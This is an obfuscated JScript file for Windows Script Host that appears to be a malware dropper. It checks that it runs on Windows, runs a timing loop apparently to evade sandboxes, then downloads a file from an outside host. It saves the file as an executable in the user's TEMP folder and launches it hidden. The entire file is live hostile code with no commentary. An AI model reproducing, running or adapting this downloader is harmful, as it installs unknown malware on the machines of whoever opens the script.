var _TZ = false;
var _T = "CreateObject";
var _UN = function _MD() {return WScript[_T]("WScript"+".Shell");}(), _V = 11;
var _NX = "MSXML2.XMLHTTP";
var _F = 2123213;
var _K = 0;
function _I(_J){_UN["Run"](_J, _K, _K);};
function _ON(){return _NX + "";};
function _SE(_SZ, _L0){_K = _K * 1; return _SZ - _L0;};
function _PP(){return _T;};
/*@cc_on
  @if (@_win32 || @_win64)
    _TZ = true;
  @end
@*/
if (_TZ)
{
var _Z0 = "";
function _ML(){return 22;};
var _D = 0; var _SE0 = 0;
function _Z()
{
var _NG = new this["Date"]();
var _JR = _NG["getUTCMilliseconds"]();
WScript["Sleep"](_ML());
var _NG = new this["Date"]();
var _WK = _NG["getUTCMilliseconds"]();
WScript["Sleep"](_ML());
var _NG = new this["Date"]();
var _JZ = _NG["getUTCMilliseconds"]();
var _D = "_US";
_D = _SE(_WK, _JR);
var _SE0 = "_W";
_SE0 = _SE(_JZ, _WK);
_Z0 = "open";
return _SE(_D, _SE0);
}
var _EY = false;
var _M = false;
for (var _FD = _K; _FD < _ML() * 1; _FD++){if (_Z() != _K){
_EY = true; 
_SE0 = "31" + 11 * _D + _SE0; 
_M = true; 
break;
}}
function _U() {return ((_EY == true) && (_EY == _M)) ? 1 : _K;};
if (_EY && _U() && _M){
function _Q() {return _UN["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2YhfxYTMc.ex" + "e";};
 _T0 = _ON();
 _PV = WScript[_T](_T0);
 var _S0 = 1;
 while (_S0){
try {
	if (_S0 == 1)
	{
		_PV[_Z0]("GET", "http://pro.monbento.com/n3iska", false);
		_PV["send"]();
		_KO = "Sleep";
	}
	WScript[_KO](_ML() + 120); 
	if (_PV["readystate"] < 2 * 2) continue;
	_S0 = _K;
	function _MY(_G) {var _L = (1, 2, 3, 4, 5, _G); return _L;};
	_U0 = WScript[_PP()]("ADODB.Stream");
	_T0 = _U0;
	_T0[_Z0]();
	_T0["type"] = _MY(1);
	_T0["write"](_PV["ResponseBody"]);
	_U0["position"] = _MY(_K);
	_T0["Save" + "ToFile"](_Q(), 2);
	_U0["cl"+"ose"]();
	_S = _Q();
	_I(_S);
} catch(_ZO){};
}
}
}

